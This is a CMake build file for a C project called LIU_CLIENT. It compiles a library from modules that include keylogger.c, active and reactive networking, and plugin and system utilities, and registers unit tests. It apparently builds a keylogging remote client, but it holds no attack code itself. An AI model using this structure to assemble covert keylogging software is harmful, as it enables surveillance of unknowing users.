cmake_minimum_required(VERSION 3.9)
project(LIU_CLIENT)

# Add flags for the compiler
add_compile_options(-Wall -Wextra -Wpedantic)
add_definitions(-DDEBUG)

# Set debug mode
set(CMAKE_BUILD_TYPE Debug)

# Create variables to use in other files
set(LIB_DIR ${PROJECT_SOURCE_DIR}/lib)
set(SRC_DIR ${PROJECT_SOURCE_DIR}/src)
set(INC_DIR ${PROJECT_SOURCE_DIR}/include)
set(PLG_DIR ${PROJECT_SOURCE_DIR}/plugins)
set(TST_DIR ${PROJECT_SOURCE_DIR}/tests)

# Create library to compile objects once only
add_library(liu_client_lib OBJECT
    ${SRC_DIR}/keylogger.c
    ${SRC_DIR}/network_active.c
    ${SRC_DIR}/network_reactive.c
    ${SRC_DIR}/network_utils.c
    ${SRC_DIR}/plugin_utils.c
    ${SRC_DIR}/system_utils.c    
)

target_include_directories(liu_client_lib 
    PRIVATE ${INC_DIR}
)

# Add the other cmake files
add_subdirectory(src)
add_subdirectory(plugins)
add_subdirectory(tests)

# Add the tests
enable_testing()
add_test(NAME network_active COMMAND test_network_active)
add_test(NAME system_utils COMMAND test_system_utils)
add_test(NAME network_utils COMMAND test_network_utils)